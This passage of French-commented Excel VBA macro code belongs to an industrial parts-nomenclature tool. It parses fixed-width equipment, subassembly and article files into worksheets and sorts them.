                WsPiecesRechange.Cells(Ind_PR, P_Document_PR).Value = Document_Dec
                
                'Modif ACH du 31/10/2008
                WsPiecesRechange.Cells(Ind_PR, P_Code_EAN_PR).Value = Code_EAN_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Obs_PR).Value = Obs_Dec
                
                WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Value = Qte
                WsPiecesRechange.Cells(Ind_PR, P_Piece_rech_PR).Value = Piece_rech_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Tech_PR).Value = Tech_Dec
                WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Font.Bold = False
            Else
                'lig = nb_ligne_element + 5
                Ind_PR = Ind_PR
                'ThisWorkbook.Sheets(Pieces_Rechange).Cells(Lig, P_Date_enrich_PR).Value = Date + heure
                If WsPiecesRechange.Cells(Ind_PR, P_Rapproche_PR).Value <> "OkTDI" Then
                    WsPiecesRechange.Cells(Ind_PR, P_Rapproche_PR).Value = "OkTDI"
                End If
                
                'Modif ACH le 20/03/2009, La mise |fffd| jour est partielle
                If WsPiecesRechange.Cells(Ind_PR, P_SacimMabec_PR).Value <> SacimMabec_Dec Then
                    WsPiecesRechange.Cells(Ind_PR, P_SacimMabec_PR).Value = SacimMabec_Dec
                    WsPiecesRechange.Cells(Ind_PR, P_SacimMabec_PR).Font.Bold = True
                Else
                    WsPiecesRechange.Cells(Ind_PR, P_SacimMabec_PR).Font.Bold = False
                End If
                
                If WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Value <> Qte Then
                    WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Value = Qte
                    WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Font.Bold = True
                Else
                    WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Font.Bold = False
                End If
                
'                WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Value = qte
'                WsPiecesRechange.Cells(Ind_PR, P_Qte_PR).Font.Bold = True
                
                If WsPiecesRechange.Cells(Ind_PR, P_Ref_Origine_PR).Value = vbNullString Then WsPiecesRechange.Cells(Ind_PR, P_Ref_Origine_PR).Value = Cle_Ref_dec         ' Etude_ref_Dec    '21 Etude_suf_Dec    '22
                If WsPiecesRechange.Cells(Ind_PR, P_Nom_Origine_PR).Value = vbNullString Then WsPiecesRechange.Cells(Ind_PR, P_Nom_Origine_PR).Value = Etude_nom_Dec
            End If

            ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i_dec - 5 '4 'nombre de lignes de Mat|fffd|riels
        End If
    Next i_dec
End Sub


Public Sub Lire_Dec(Lig As Long, Nom_Onglet As String)
    Dim Mes As String
    Dim i As Integer
    
    Dim val_range As String

    val_range = VBA.LTrim(VBA.Str(Lig))
    val_range = "A" + val_range + ":DZ" + val_range
    Data_dec = ThisWorkbook.Sheets(Nom_Onglet).Range(val_range).Value
    Num_ligne_Dec = Data_dec(1, P_Num_ligne_Dec)          '0
    Etat_Dec = Data_dec(1, P_etat_Dec)                    '1
    Div_Dec = Data_dec(1, P_div_Dec)                      '2
    Met_Dec = Data_dec(1, P_met_Dec)                      '3
    Ligne_Dec = Data_dec(1, P_ligne_Dec)                  '4
    Efp_Dec = Data_dec(1, P_EFP_Dec)                      '5
    Fp_Dec = Data_dec(1, P_FP_Dec)                        '6
    Sfp_Dec = Data_dec(1, P_SFP_Dec)                      '7
    Op_Dec = Data_dec(1, P_OP_Dec)                        '8
    Lib_pt_Dec = Data_dec(1, P_lib_pt_Dec)                '9
    Ilot_Dec = Data_dec(1, P_ilot_Dec)                    '10
    Zone_Dec = Data_dec(1, P_zone_Dec)                    '11
    Repere_Dec = Data_dec(1, P_Repere_Dec)                '12
    Num_ssen_Dec = Data_dec(1, P_Num_ssen_Dec)            '13
    Suf_ssen_Dec = Data_dec(1, P_Suf_ssen_Dec)            '14
    Rep_complet_Dec = Data_dec(1, P_Rep_complet_Dec)      '15
    Niveau_dec = Data_dec(1, P_Niveau_dec)                '16
    Simon_Dec = Data_dec(1, P_Simon_Dec)                  '17
    Date_modif_Dec = Data_dec(1, P_Date_modif_Dec)        '18
    Categorie_Dec = Data_dec(1, P_Categorie_Dec)          '19
    Nomencl_Dec = Data_dec(1, P_Nomencl_Dec)              '20
    Etude_ref_Dec = VBA.Trim(Data_dec(1, P_Etude_ref_Dec))   '21
    Etude_suf_Dec = VBA.Trim(Data_dec(1, P_Etude_suf_Dec))   '22
    Etude_nom_Dec = VBA.RTrim(Data_dec(1, P_Etude_nom_Dec))   '23
    Design_Dec = VBA.RTrim(Data_dec(1, P_design_Dec))         '24
    Ref_Int_Dec = VBA.Trim(Data_dec(1, P_Ref_Int_Dec))       '29
    Nom_Int_Dec = VBA.RTrim(Data_dec(1, P_Nom_Int_Dec))       '30
    Code_EAN_Dec = Data_dec(1, P_Code_EAN_Dec)          '31
    Qte_Dec = Data_dec(1, P_Qte_Dec)                      '32
    SacimMabec_Dec = Data_dec(1, P_SacimMabec_Dec)        '33

    'If Data_dec() _col = 38 Then P_lib_fonc = I
    Obs_Dec = Data_dec(1, P_Obs_Dec)                      '40
    Note_Dec = Data_dec(1, P_note_Dec)                    '41
    Piece_rech_Dec = Data_dec(1, P_Piece_rech_Dec)        '42
    Document_Dec = Data_dec(1, P_document_Dec)            '43
    Tech_Dec = Data_dec(1, P_Tech_Dec)                    '44
    CtrL_For_dec = Data_dec(1, P_CtrL_For_dec)            '45
    
    If Etude_suf_Dec = vbNullString Then
        Cle_Ref_dec = Etude_ref_Dec
    Else
        Cle_Ref_dec = Etude_ref_Dec + "_" + Etude_suf_Dec
    End If
    Cle_Art_dec = Etude_nom_Dec + "_" + Cle_Ref_dec
    For i = 1 To VBA.Len(Cle_Art_dec)
        If VBA.Mid(Cle_Art_dec, i, 1) <> " " Then Mes = Mes + VBA.Mid(Cle_Art_dec, i, 1)
    Next i
    Cle_Art_dec = Mes
End Sub
Attribute VB_Name = "TDI_Conversion_RENOM_TDi"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.1 du 17/03/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


' Repise fonction retour fournisseur JM le 01-03-2007
' modif pour cas d'un seul sous ensemble

Dim fichier_travail As Variant
Dim Rep_inv As String
Dim nb_max_lig As Long
Dim Lig As Long

Dim nbMat  As Integer
Dim NbSSEN  As Integer
Dim nbArticle As Integer

Dim Inventaire  As Variant
Dim Suf_Inv  As Variant
Dim Lib_inv  As Variant
Dim Ref_mach  As Variant
Dim Nom_integrateur As Variant

Dim ind_inv As Variant
Dim ind_pose As Variant
Dim ind_niv As Variant
Dim ind_cat As Variant
Dim ind_qte As Variant
Dim ind_suf_inv As Variant
Dim ind_lib_inv As Variant
Dim ind_nom_four As Variant
Dim ind_ref_mach As Variant
Dim ind_num_serie As Variant
Dim ind_doc As Variant
Dim ind_ctrl As Variant
Dim ind_nom_integrateur As Variant
Dim extension As Variant
Dim Nb_equ As Integer
Dim nb_ssen  As Integer
Dim Nb_FIDR  As Integer
Dim Nb_art  As Integer
Dim Nb_FIDD As Integer

Dim deb_dec  As Integer
Dim deb_mat   As Integer
Dim deb_doc As Integer

Dim Ssenb As Variant

Dim lib_ssen As Variant

Dim Sacim  As Variant
Dim nom_int  As Variant
Dim ref_int As Variant

Dim Suffixe  As Variant
Dim lib_art As Variant
Dim Document As Variant
Dim Nom_Four As String
Dim Qte As String
Dim num_serie As String
Dim suf_ssen As String
Dim Repere As String
Dim NATURE As String
Dim Tech As String
Dim Ref_Four As String
Dim piece_rech As String
Dim Obs As String
Dim Note As String
Dim Date_creat As String
Dim Pos_creat As Variant
Dim Tri_ren_tdi As Boolean

Dim fileToOpen  As Variant
Dim Chemin   As Variant
Dim Mes As Variant

Dim fic_bdn As Variant

Dim lg As Variant


Function Lr_Trim(Ch As Variant) As Variant
    Ch = VBA.LTrim(Ch)
    Ch = VBA.RTrim(Ch)
    Lr_Trim = Ch
End Function


Sub lit_equipmt()

    Lig = deb_dec
    Nb_equ = 0
    extension = ThisWorkbook.Sheets("Commande").Cells(15, 3).Value
    fic_bdn = Chemin + "tequipmt." & extension
    ind_inv = 8
    ind_suf_inv = 9
    ind_nom_four = 10
    ind_lib_inv = 11
    ind_pose = 5
    ind_niv = 6
    ind_cat = 7
    ind_qte = 15
    ind_doc = 20
    ind_ctrl = 23
    
    ind_num_serie = 14
       
    ' feuille Decoupage
    ind_pose = 16 '5
    ind_niv = 17 '6
    ind_inv = 22 '8
    ind_suf_inv = 23 '9
    ind_nom_four = 24 '10
    ind_lib_inv = 25 '11
    ind_ref_mach = 30
    ind_nom_integrateur = 31
    
    ind_niv = 17 '6
    ind_cat = 20 '7
    ind_qte = 33 '15
    ind_doc = 44 '20
    ind_ctrl = 46 '23
    
    'ind_ref_mach = vbnullstring
    ind_num_serie = 32 '14

    On Error GoTo Fin
    Dir fic_bdn
    
    Open fic_bdn For Input As #1
    
    Do While Not EOF(1)
        Line Input #1, Mes
        Debug.Print Mes
        Lig = Lig + 1
        Nb_equ = Nb_equ + 1
        
        Inventaire = Lr_Trim(VBA.Mid(Mes, 32, 10))
        Suf_Inv = Lr_Trim(VBA.Mid(Mes, 42, 4))
        Lib_inv = Lr_Trim(VBA.Mid(Mes, 49, 30))
        Nom_Four = Lr_Trim(VBA.Mid(Mes, 149, 28))
        Nom_integrateur = Nom_Four
        
        Ref_mach = Lr_Trim(VBA.Mid(Mes, 177, 15))
        num_serie = Lr_Trim(VBA.Mid(Mes, 192, 20))
        Qte = 1
        
       
        With ThisWorkbook.Sheets(shDecoupage)
            .Cells(Lig, 3).Value = ThisWorkbook.Sheets(ShAffaire).Cells(7, 5).Value
            .Cells(Lig, 4).Value = ThisWorkbook.Sheets(ShAffaire).Cells(8, 5).Value
            .Cells(Lig, 1).Value = Lig - 3
            .Cells(Lig, 10).Value = VBA.Mid(Mes, 3, 5)
            .Cells(Lig, ind_pose).Value = 0
            .Cells(Lig, ind_niv).Value = "E"
            .Cells(Lig, ind_cat).Value = "F"
            .Cells(Lig, 19).Value = Date
            .Cells(Lig, 21).Value = "O"
        
            If VBA.Mid(Inventaire, 1, 1) = "E" Or VBA.Mid(Inventaire, 1, 1) = "R" Or VBA.Mid(Inventaire, 1, 1) = "D" Then
                .Cells(Lig, ind_cat).Value = "B"
                Nom_Four = "RENAULT"
            Else
                
            End If
            .Cells(Lig, ind_inv).Value = Inventaire
            .Cells(Lig, ind_suf_inv).Value = Suf_Inv
            .Cells(Lig, ind_nom_four).Value = Nom_Four
            .Cells(Lig, ind_lib_inv).Value = Lib_inv
            .Cells(Lig, ind_nom_integrateur).Value = Nom_integrateur
            .Cells(Lig, ind_ref_mach).Value = Ref_mach
            .Cells(Lig, ind_qte).Value = Qte
            .Cells(Lig, ind_doc).Value = "SP"
            .Cells(Lig, ind_num_serie).Value = num_serie
            'ThisWorkbook.Sheets(shDecoupage).Cells(lig, ind_ctrl).Value = Inventaire + "_" + Suf_inv
            ThisWorkbook.Sheets("Commande").Cells(9, 12).Value = Nb_equ
        End With
 '       ThisWorkbook.Sheets("Commande").Cells(14, 12).Value = lig
    Loop
    Close #1
Fin:
    Lig = deb_mat
    On Error GoTo 0
End Sub


Public Sub Ecrit_ssen()
    Dim sh As String
    Dim OK As Boolean
    OK = False
    
    'Modif AC du 28/04/2008
    If Code_Dossier(VBA.Left(suf_ssen, 2)) Then
        OK = True
    ElseIf Code_Programme(VBA.Left(suf_ssen, 2)) Then
        OK = True
    End If

    If OK Then
        sh = shDocuments
        Nb_FIDR = Nb_FIDR + 1
        deb_doc = deb_doc + 1
        Lig = deb_doc
        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 12).Value = Nb_FIDR
        Select Case VBA.Mid(Ssenb, 1, 2)
            Case "E1", "E2", "E3", "E4", "E5", "E6", "E7", "E8", "E9"
                If VBA.Len(Ssenb) = 10 Then
                    ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "B"
                    Nom_Four = "RENAULT"
                End If
                
            Case "D0", "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9"
                If VBA.Len(Ssenb) = 10 Then
                    ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "B"
                    Nom_Four = "RENAULT"
                End If
            Case "R9", "R1"
                If VBA.Len(Ssenb) = 10 Then
                    ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "R"
                    Nom_Four = "RENAULT"
                End If
            Case Else
        
        End Select
    Else
        sh = shMateriels
        deb_mat = deb_mat + 1
        nb_ssen = nb_ssen + 1
        Lig = deb_mat
        Select Case VBA.Mid(Ssenb, 1, 2)
            Case "E1", "E2", "E3", "E4", "E5", "E6", "E7", "E8", "E9"
                ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "B"
                Nom_Four = "RENAULT"
            Case "D0", "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9"
                ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "B"
                Nom_Four = "RENAULT"
            Case "R9"
                ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "R"
                Nom_Four = "RENAULT"
            Case Else
                ThisWorkbook.Sheets(sh).Cells(Lig, P_Categorie_Dec).Value = "F"
        End Select
    End If
    
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Num_ligne_Dec).Value = Pos_creat 'lig - 3
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Niveau_dec).Value = 1
    If sh = shDocuments Then
        ' document
        ThisWorkbook.Sheets(sh).Cells(Lig, P_Niveau_dec).Value = "FR"
        ThisWorkbook.Sheets(sh).Cells(Lig, P_Rep_complet_Dec).Value = "2"
    Else
        'mat|fffd|riel
        ThisWorkbook.Sheets(sh).Cells(Lig, P_Niveau_dec).Value = "S"
        ThisWorkbook.Sheets(sh).Cells(Lig, P_Rep_complet_Dec).Value = "2"
    End If
    
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Num_ssen_Dec).Value = Inventaire
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Suf_ssen_Dec).Value = Suf_Inv
    
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Etude_ref_Dec).Value = Ssenb
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Etude_suf_Dec).Value = suf_ssen
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Etude_nom_Dec).Value = Nom_Four
    ThisWorkbook.Sheets(sh).Cells(Lig, P_design_Dec).Value = lib_ssen
    
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Ref_Int_Dec).Value = Ref_mach
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Nom_Int_Dec).Value = Nom_integrateur
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Code_EAN_Dec).Value = num_serie
    
    
    ThisWorkbook.Sheets(sh).Cells(Lig, P_Qte_Dec).Value = Qte
    ThisWorkbook.Sheets(sh).Cells(Lig, P_document_Dec).Value = "SP"
    ThisWorkbook.Sheets(sh).Cells(Lig, P_CtrL_For_dec + 3).Value = Ssenb + "_" + suf_ssen 'Inventaire + "_" + Suf_inv + ":" +
    ThisWorkbook.Sheets(sh).Cells(Lig, P_CtrL_For_dec + 6).Value = Date_creat
End Sub


Sub lit_ssen()
    nb_ssen = 0
    Nb_FIDR = 0

    fic_bdn = Chemin + "tssen." & extension
    Open fic_bdn For Input As #1
    Do While Not EOF(1)
        Line Input #1, Mes
        Inventaire = Lr_Trim(VBA.Mid(Mes, 27, 10))
        Suf_Inv = Lr_Trim(VBA.Mid(Mes, 37, 4))
        Ssenb = Lr_Trim(VBA.Mid(Mes, 41, 10))
        suf_ssen = Lr_Trim(VBA.Mid(Mes, 51, 4))
        Repere = Lr_Trim(VBA.Mid(Mes, 56, 4))
        Nom_Four = Lr_Trim(VBA.Mid(Mes, 60, 28))
        Ref_mach = Lr_Trim(VBA.Mid(Mes, 88, 15))
        lib_ssen = Lr_Trim(VBA.Mid(Mes, 103, 30))
        Qte = Lr_Trim(VBA.Mid(Mes, 153, 3))
        Ecrit_ssen
    Loop
    Close #1
End Sub

Public Sub ecrit_article()
    Dim sh As String
    Dim OK As Boolean
    OK = False
    
    'Modif AC du 28/04/2008
    If Code_Dossier(VBA.Left(suf_ssen, 2)) Then
        OK = True
    ElseIf Code_Programme(VBA.Left(suf_ssen, 2)) Then
        OK = True
    End If

    If OK Then
        sh = shDocuments
        Nb_FIDD = Nb_FIDD + 1
        deb_doc = deb_doc + 1
        Lig = deb_doc
        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(24, 3).Value = Nb_FIDD
        frmExportRenom.txtNbDocs.Text = Nb_FIDD
    Else
        sh = shMateriels
        Nb_art = Nb_art + 1
        deb_mat = deb_mat + 1
        Lig = deb_mat
        'ThisWorkbook.Sheets("Commande").Cells(10, 12).Value = nb_equ + nb_ssen
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(23, 3).Value = Nb_art
    End If
    If Pos_creat = 0 Then
        Pos_creat = Lig + 100000
    End If
    With ThisWorkbook.Sheets(sh)
        .Cells(Lig, P_Num_ligne_Dec).Value = Pos_creat ' lig - 3
        .Cells(Lig, P_Repere_Dec).Value = Repere
        .Cells(Lig, P_Num_ssen_Dec).Value = Ssenb
        .Cells(Lig, P_Suf_ssen_Dec).Value = suf_ssen
        .Cells(Lig, P_Rep_complet_Dec).Value = 3 ' niveau fournisseur
        
        If sh = shDocuments Then
            ' document
            .Cells(Lig, P_Niveau_dec).Value = "FD"
        Else
            'mat|fffd|riel
            .Cells(Lig, P_Niveau_dec).Value = "A"
        End If
         
        .Cells(Lig, P_Categorie_Dec).Value = NATURE
        .Cells(Lig, P_Etude_ref_Dec).Value = Ref_Four
        .Cells(Lig, P_Etude_suf_Dec).Value = Suffixe
        .Cells(Lig, P_Etude_nom_Dec).Value = Nom_Four
        .Cells(Lig, P_design_Dec).Value = lib_art
        .Cells(Lig, P_Ref_Int_Dec).Value = ref_int
        .Cells(Lig, P_Nom_Int_Dec).Value = nom_int
        .Cells(Lig, P_Code_EAN_Dec).Value = num_serie
        .Cells(Lig, P_Qte_Dec).Value = Qte
        .Cells(Lig, P_SacimMabec_Dec).Value = Sacim
        .Cells(Lig, P_Obs_Dec).Value = Obs
        .Cells(Lig, P_note_Dec).Value = Note
        'modif 05-06-2006
        .Cells(Lig, P_Piece_rech_Dec).Value = piece_rech
        '****************
        .Cells(Lig, P_document_Dec).Value = Document
        If Tech = "A" Then Tech = vbNullString
        .Cells(Lig, P_Tech_Dec).Value = Tech
        .Cells(Lig, P_CtrL_For_dec + 3).Value = Ssenb + "_" + suf_ssen + ":" + Repere
        .Cells(Lig, P_CtrL_For_dec + 6).Value = Date_creat
        'ThisWorkbook.Sheets(sh).Cells(lig, P_CtrL_For_dec + 4).Value = pos_creat
    End With
    'ecrit_article
End Sub


'===================================
' Cette fonctio permet de trouver
' le d|fffd|but donn|fffd|es sur les feuilles
' Decoupage et Materiels
' non exploite
'===================================
Sub init_conv()
    Dim Reponse As Variant
    Dim Msg, Style, Title, Help, Ctxt
    Dim Fin As Boolean
    
    Msg = "Souhaitez-vous Supprimer les donn|fffd|es ?"    ' D|fffd|finit le message.
    Style = vbYesNo + vbCritical + vbDefaultButton2    ' D|fffd|finit les boutons.
    Title = "Importation des Donn|fffd|es Nomenclatures "    ' D|fffd|finit le titre.
    Help = "DEMO.HLP"    ' D|fffd|finit le fichier d'aide.
    Ctxt = 1000    ' D|fffd|finit le contexte de
    
    Reponse = MsgBox(Msg, Style, Title, Help, Ctxt)
    deb_dec = 3
    deb_mat = 3
    deb_doc = 3
    Nb_equ = 0
    nb_ssen = 0
    Nb_art = 0
    Nb_FIDR = 0
    Nb_FIDD = 0
    ThisWorkbook.Sheets("Commande").Cells(9, 12).Value = 0
    ThisWorkbook.Sheets("Commande").Cells(10, 12).Value = 0
    ThisWorkbook.Sheets("Commande").Cells(11, 12).Value = 0
    ThisWorkbook.Sheets("Commande").Cells(12, 12).Value = 0
    ThisWorkbook.Sheets("Commande").Cells(13, 12).Value = 0
    If Reponse = vbYes Then    ' L'utilisateur a choisi Oui.
        nb_element = 0
        design_err = 0
        ref_fab_err = 0
        nom_fab_err = 0
        'MyString = "Oui"    ' Effectue une action.
        ' Nettoyage des feuilles
        With Worksheets(shDecoupage).Range("4:65536")
            .Delete
            .NumberFormat = "@"
        End With
        With Worksheets(shMateriels).Range("4:65536")
            .Delete
            .NumberFormat = "@"
        End With
        With Worksheets(shDocuments).Range("4:65536")
            .Delete
            .NumberFormat = "@"
        End With
        Worksheets("Commande").Activate
    
    Else    ' L'utilisateur a choisi Non.
        ' recherche du d|fffd|but decoupage et mat|fffd|riel
        Fin = False
        While Not Fin
            If ThisWorkbook.Sheets(shDecoupage).Cells(deb_dec + 1, 1).Value = vbNullString Then
                Fin = True
            Else
                deb_dec = deb_dec + 1
            End If
        Wend
        Fin = False
        While Not Fin
            If ThisWorkbook.Sheets(shMateriels).Cells(deb_mat + 1, 1).Value = vbNullString Then
                Fin = True
            Else
                deb_mat = deb_mat + 1
            End If
        Wend
        Fin = False
        While Not Fin
            If ThisWorkbook.Sheets(shDocuments).Cells(deb_doc + 1, 1).Value = vbNullString Then
                Fin = True
            Else
                deb_doc = deb_doc + 1
            End If
        Wend
        'MyString = "Non"    ' Effectue une action.
    End If

End Sub

Sub mise_enforme(i As Integer)
    Dim Mes As String
    Dim j As Integer

    Sheets(shMateriels).Select
    Rows("3:3").Select
    Mes = "4:" & VBA.Str(i)
    Rows("4:30000").Select
    If Not Tri_ren_tdi Then
        Selection.Sort Key1:=Range("Y4"), Order1:=xlAscending, Key2:=Range("E4") _
            , Order2:=xlAscending, Key3:=Range("B4"), Order3:=xlAscending, Header:= _
            xlGuess, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
            DataOption1:=xlSortNormal, DataOption2:=xlSortNormal, DataOption3:= _
            xlSortTextAsNumbers
        j = 0
         
        If ThisWorkbook.Sheets(shMateriels).Cells(4, 1).Value <> vbNullString Then
            'Modif ACH V1.09b du 25/03/2008
            j = SheetCls.LastLineColumn(ThisWorkbook.Sheets(shMateriels), 1)
        End If
    Else
        Selection.Sort Key1:=Range("A4"), Order1:=xlAscending, DataOption1:=xlSortTextAsNumbers
        j = 0
        If ThisWorkbook.Sheets(shMateriels).Cells(4, 1).Value <> vbNullString Then
            'Modif ACH V1.09b du 25/03/2008
            j = SheetCls.LastLineColumn(ThisWorkbook.Sheets(shMateriels), 1)
        End If
    End If
    Sheets(shDocuments).Select
    Rows("3:3").Select
    Mes = "4:" & VBA.Str(i)
    Rows("4:30000").Select
    Tri_ren_tdi = False
    If Not Tri_ren_tdi Then
        Selection.Sort Key1:=Range("Y4"), Order1:=xlAscending, Key2:=Range("E4") _
            , Order2:=xlAscending, Key3:=Range("B4"), Order3:=xlAscending, Header:= _
            xlGuess, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
            DataOption1:=xlSortNormal, DataOption2:=xlSortNormal, DataOption3:= _
            xlSortTextAsNumbers
        j = 0
        If ThisWorkbook.Sheets(shDocuments).Cells(4, 1).Value <> vbNullString Then
            'Modif ACH V1.09b du 25/03/2008
            j = SheetCls.LastLineColumn(ThisWorkbook.Sheets(shDocuments), 1)
        End If
    Else
        Selection.Sort Key1:=Range("A4"), Order1:=xlAscending, DataOption1:=xlSortTextAsNumbers
        j = 0
        If ThisWorkbook.Sheets(shDocuments).Cells(4, 1).Value <> vbNullString Then
            'Modif ACH V1.09b du 25/03/2008
            j = SheetCls.LastLineColumn(ThisWorkbook.Sheets(shDocuments), 1)
        End If
    End If
    j = 0
    If ThisWorkbook.Sheets(shDocuments).Cells(4, 1).Value <> vbNullString Then
        'Modif ACH V1.09b du 25/03/2008
        j = SheetCls.LastLineColumn(ThisWorkbook.Sheets(shDocuments), 1)
    End If
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Mise_En_Forme").Value = "O"
End Sub


Sub lit_articles()
    Dim sh As String
    Dim OK As Boolean
    
    Nb_FIDD = 0
    Nb_art = 0
    fic_bdn = Chemin + "tnomencl." & extension
    Open fic_bdn For Input As #1
    Do While Not EOF(1)
    
        Line Input #1, Mes
        Ssenb = Lr_Trim(VBA.Mid(Mes, 3, 10))
        suf_ssen = Lr_Trim(VBA.Mid(Mes, 13, 4))
        
        NATURE = Lr_Trim(VBA.Mid(Mes, 28, 1))
        Tech = Lr_Trim(VBA.Mid(Mes, 29, 1))
        Sacim = VBA.Mid(Mes, 30, 10)
        Repere = Lr_Trim(VBA.Mid(Mes, 40, 8))
        Suffixe = vbNullString
        Document = Lr_Trim(VBA.Mid(Mes, 66, 2))
        Select Case NATURE
        Case "B"
            Ref_Four = Lr_Trim(VBA.Mid(Mes, 48, 10))
            Suffixe = Lr_Trim(VBA.Mid(Mes, 58, 4))
            Nom_Four = "RENAULT"
        Case "R"
            Ref_Four = Lr_Trim(VBA.Mid(Mes, 48, 10))
            Suffixe = Lr_Trim(VBA.Mid(Mes, 58, 4))
            Nom_Four = "RENAULT"
        Case "F"
            Ref_Four = Lr_Trim(VBA.Mid(Mes, 310, 15))
            Nom_Four = Lr_Trim(VBA.Mid(Mes, 282, 28))
            nom_int = Lr_Trim(VBA.Mid(Mes, 310, 15))
            ref_int = Lr_Trim(VBA.Mid(Mes, 282, 28))
            If Document = "  " Then Document = "SP"
            If Ref_Four = vbNullString Then Ref_Four = ref_int
        Case "C"
            Ref_Four = Lr_Trim(VBA.Mid(Mes, 201, 50))
            Nom_Four = Lr_Trim(VBA.Mid(Mes, 251, 28))
            nom_int = Lr_Trim(VBA.Mid(Mes, 310, 15))
            ref_int = Lr_Trim(VBA.Mid(Mes, 282, 28))
            If Document = "  " Then Document = "SP"
        Case Else
            Ref_Four = Lr_Trim(VBA.Mid(Mes, 201, 50))
            Nom_Four = Lr_Trim(VBA.Mid(Mes, 251, 28))
            nom_int = Lr_Trim(VBA.Mid(Mes, 310, 15))
            ref_int = Lr_Trim(VBA.Mid(Mes, 282, 28))
        End Select
        lib_art = Lr_Trim(VBA.Mid(Mes, 71, 100))
        num_serie = Lr_Trim(VBA.Mid(Mes, 171, 30))
              
        Qte = VBA.val(Lr_Trim(VBA.Mid(Mes, 279, 3)))
        piece_rech = Lr_Trim(VBA.Mid(Mes, 326, 1))

        Obs = Lr_Trim(VBA.Mid(Mes, 328, 40))
        
        Note = Lr_Trim(VBA.Mid(Mes, 368, 15))
        OK = False
        
        'Modif AC du 28/04/2008
        If Code_Dossier(VBA.Left(suf_ssen, 2)) Then
            OK = True
        ElseIf Code_Programme(VBA.Left(suf_ssen, 2)) Then
            OK = True
        End If
        
'        If VBA.Left(suf_ssen, 2) = "D1" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D2" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D3" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D4" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D5" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D6" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D7" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D8" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "D9" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PA" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PB" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PE" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PD" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PH" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PI" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PF" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PG" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PL" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PM" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PN" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PP" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PR" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PS" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PV" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PX" Then ok = True
'        If VBA.Left(suf_ssen, 2) = "PY" Then ok = True
        
        If OK Then
            sh = shDocuments
            Nb_FIDD = Nb_FIDD + 1
            deb_doc = deb_doc + 1
            Lig = deb_doc
            'ThisWorkbook.Sheets("Commande").Cells(10, 12).Value = nb_equ + nb_ssen
            ThisWorkbook.Sheets("Commande").Cells(13, 12).Value = Nb_FIDD
        Else
            sh = shMateriels
            Nb_art = Nb_art + 1
            deb_mat = deb_mat + 1
            Lig = deb_mat
            'ThisWorkbook.Sheets("Commande").Cells(10, 12).Value = nb_equ + nb_ssen
            ThisWorkbook.Sheets("Commande").Cells(11, 12).Value = Nb_art
        End If

        With ThisWorkbook.Sheets(sh)
            .Cells(Lig, 1).Value = Lig - 3
            .Cells(Lig, 2).Value = Repere
            .Cells(Lig, 3).Value = Ssenb
            .Cells(Lig, 4).Value = suf_ssen
            .Cells(Lig, 5).Value = 2 ' niveau fournisseur
        
            If sh = shDocuments Then
                ' document
                .Cells(Lig, 6).Value = "FD"
            Else
                'mat|fffd|riel
                 .Cells(Lig, 6).Value = "A"
            End If
            .Cells(Lig, 7).Value = NATURE
            .Cells(Lig, 8).Value = Ref_Four
            .Cells(Lig, 9).Value = Suffixe
            .Cells(Lig, 10).Value = Nom_Four
